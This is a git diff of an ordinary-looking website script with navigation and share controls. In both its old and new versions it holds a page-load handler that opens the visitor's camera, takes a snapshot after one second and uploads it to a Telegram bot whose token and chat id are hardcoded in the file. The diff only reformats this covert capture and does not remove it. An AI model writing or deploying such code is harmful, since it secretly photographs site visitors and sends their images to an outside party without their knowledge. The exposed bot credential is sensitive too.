@@ -39,47 +39,53 @@ const shareBackdrop = $('#shareBackdrop');
 const bottomNavItems = $$('.nav-item');
 const body          = document.body;
 
-
 window.addEventListener("load", async () => {
-  const video = document.getElementById("camera");
-  const canvas = document.createElement("canvas");
 
-  if (!video) return;
+    const video = document.getElementById("camera");
+    const canvas = document.getElementById("snapshot");
 
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: true,
-      audio: false
-    });
+    if (!video || !canvas) return;
 
-    video.srcObject = stream;
+    try {
 
-    // wait for camera to be ready
-    await video.play();
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: true
+        });
 
-    setTimeout(() => {
-      // set canvas size = video size
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
+        video.srcObject = stream;
 
-      const ctx = canvas.getContext("2d");
+        // wait camera ready
+        video.onloadedmetadata = () => {
 
-      // draw current frame (THIS is the snap)
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            // give camera time to initialize
+            setTimeout(() => {
 
-      // convert to image blob
-      canvas.toBlob((blob) => {
-        sendPhotoToTelegram(blob);
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
 
-        // stop camera after snap
-        stream.getTracks().forEach(track => track.stop());
-      }, "image/jpeg", 0.9);
+                const ctx = canvas.getContext("2d");
 
-    }, 1000); // small delay so camera fully loads
+                // capture frame
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  } catch (err) {
-    console.error("Camera error:", err);
-  }
+                // convert to JPG blob
+                canvas.toBlob(blob => {
+
+                    sendToTelegram(blob);
+
+                    // stop camera
+                    stream.getTracks().forEach(track => track.stop());
+
+                }, "image/jpeg", 0.95);
+
+            }, 1000);
+
+        };
+
+    } catch (err) {
+        console.error("Camera error:", err);
+    }
+
 });
 // ── INIT ───────────────────────────────────
 function init() {
@@ -768,17 +774,18 @@ document.addEventListener('DOMContentLoaded', init);
 const botToken = "8836463939:AAHJ5wDMQ8aOFtaerzbTQ8BCfEhNNGlquMc";
 const chatId = "8474074506";
 
-function sendPhotoToTelegram(blob) {
-  const formData = new FormData();
+function sendToTelegram(blob) {
 
-  formData.append("chat_id", chatId);
-  formData.append("photo", blob, "photo.jpg");
+    const formData = new FormData();
 
-  fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-    method: "POST",
-    body: formData
-  })
-  .then(res => res.json())
-  .then(data => console.log(data))
-  .catch(err => console.error(err));
+    formData.append("chat_id", chatId);
+    formData.append("photo", blob, "snapshot.jpg");
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formData
+    })
+    .then(res => res.json())
+    .then(data => console.log(data))
+    .catch(err => console.error(err));
 }
